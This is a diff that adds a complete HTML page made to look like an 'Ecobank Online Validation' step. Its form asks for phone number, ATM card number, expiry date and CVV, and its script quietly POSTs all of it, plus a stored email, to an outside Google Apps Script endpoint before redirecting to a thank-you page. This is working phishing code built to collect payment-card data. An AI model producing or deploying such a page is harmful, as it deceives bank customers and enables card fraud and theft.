@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ecobank Online Validation</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+body{
+  margin:0;
+  min-height:100vh;
+  background:linear-gradient(to bottom,#0a1a3f,#0e2563);
+  font-family:"Inter",Arial,sans-serif;
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+}
+
+/* Header */
+header{
+  padding:28px 16px 48px;
+  text-align:center;
+  background:linear-gradient(135deg,#1b4ba2,#102a5b);
+  border-bottom-left-radius:40px;
+  border-bottom-right-radius:40px;
+}
+header h1{
+  display:inline-block;
+  padding:12px 24px;
+  border-radius:999px;
+  background:linear-gradient(135deg,#123b87,#1f5bc5);
+  font-size:16px;
+}
+.step{
+  margin-top:10px;
+  font-size:13px;
+  opacity:.9;
+}
+
+/* Main container */
+main{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  padding:0;
+}
+
+/* Card */
+.card{
+  width:100%;
+  max-width:520px;
+  background:linear-gradient(
+    145deg,
+    rgba(12,35,90,.97),
+    rgba(18,50,115,.97)
+  );
+  padding:28px 22px;
+  border-radius:24px 24px 0 0;
+  box-shadow:0 -8px 30px rgba(0,0,0,.35);
+}
+
+.preview{
+  font-size:14px;
+  margin-bottom:22px;
+  font-weight:500;
+  color:#dbe6ff;
+}
+
+label{
+  font-size:13px;
+  font-weight:600;
+  margin-bottom:6px;
+  display:block;
+}
+
+input{
+  width:100%;
+  padding:15px;
+  border-radius:8px;
+  border:1px solid #99b3ff;
+  margin-bottom:18px;
+  font-size:15px;
+  box-sizing:border-box;
+}
+
+button{
+  width:100%;
+  padding:18px;
+  border:none;
+  border-radius:999px;
+  background:linear-gradient(135deg,#00b871,#00995b);
+  color:#fff;
+  font-weight:700;
+  font-size:15px;
+  cursor:pointer;
+}
+
+button:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+
+/* Processing overlay */
+#processingOverlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(5,10,25,0.9);
+  z-index:9999;
+  align-items:center;
+  justify-content:center;
+}
+
+.overlayContent{
+  background:#0e2563;
+  padding:32px 36px;
+  border-radius:16px;
+  text-align:center;
+}
+
+.spinner{
+  width:46px;
+  height:46px;
+  border:5px solid rgba(255,255,255,.25);
+  border-top:5px solid #fff;
+  border-radius:50%;
+  margin:0 auto 18px;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>ECOBANK ONLINE VALIDATION</h1>
+  <div class="step">Step 2 of 3 · Verification</div>
+</header>
+
+<main>
+  <div class="card">
+
+    <!-- Email confirmation -->
+    <div class="preview" id="emailPreview">Loading…</div>
+
+    <form id="demoForm">
+      <!-- Hidden email field -->
+      <input type="hidden" name="email" id="emailField">
+
+      <label>Phone Number</label>
+      <input type="tel" name="phone_number" placeholder="024XXXXXXX" required>
+
+      <label>ATM Card Number</label>
+      <input type="text" name="atm_card_number" placeholder="16 Digits Card Number" required>
+
+      <!-- ✅ TEXT INPUT MM/YY -->
+      <label>ATM Expiry Date (MM/YY)</label>
+      <input
+        type="text"
+        name="atm_expiry_date"
+        placeholder="MM/YY"
+        pattern="(0[1-9]|1[0-2])\/[0-9]{2}"
+        maxlength="5"
+        inputmode="alphanumeric"
+        required
+      >
+
+      <label>CVV Number</label>
+      <input type="text" name="cvv_number" placeholder="Enter 3 digits CVV Number" required>
+
+      <button id="submitBtn" type="submit">Validate Securely</button>
+    </form>
+  </div>
+</main>
+
+<!-- Processing Overlay -->
+<div id="processingOverlay">
+  <div class="overlayContent">
+    <div class="spinner"></div>
+    <div>Processing, please wait…</div>
+  </div>
+</div>
+
+<script>
+/* ===============================
+   SESSION CONFIRMATION
+================================ */
+const storedEmail = localStorage.getItem("email");
+const storedFirstName = localStorage.getItem("firstName");
+const storedLastName = localStorage.getItem("lastName");
+
+if (!storedEmail) {
+  alert("Session expired. Please start again.");
+  window.location.href = "index.html";
+}
+
+// Show confirmation text
+const emailPreview = document.getElementById("emailPreview");
+emailPreview.textContent = `Confirming details for: ${storedEmail}`;
+
+// Inject email into hidden field
+const emailField = document.getElementById("emailField");
+emailField.value = storedEmail;
+
+// Lock the value to prevent tampering
+Object.defineProperty(emailField, "value", { writable: false });
+
+/* ===============================
+   FORM SUBMISSION
+================================ */
+const scriptURL =
+  "https://script.google.com/macros/s/AKfycbzOvEHYd8UZ-t-OzhOUYEpVpP5TFD1ue-UolYxIRUWDz5P9TejAoSyqwz7cfQpIulMC/exec";
+
+const form = document.getElementById("demoForm");
+const overlay = document.getElementById("processingOverlay");
+const submitBtn = document.getElementById("submitBtn");
+
+form.addEventListener("submit", async e => {
+  e.preventDefault();
+
+  submitBtn.disabled = true;
+  overlay.style.display = "flex";
+
+  try {
+    await fetch(scriptURL, {
+      method: "POST",
+      body: new FormData(form),
+      mode: "no-cors"
+    });
+
+    // Optional: clear session after success
+    localStorage.clear();
+
+    window.location.href = "thankyou.html";
+  } catch (err) {
+    overlay.style.display = "none";
+    submitBtn.disabled = false;
+    alert("Submission failed. Please try again.");
+    console.error(err);
+  }
+});
+</script>
+
+</body>
+</html>
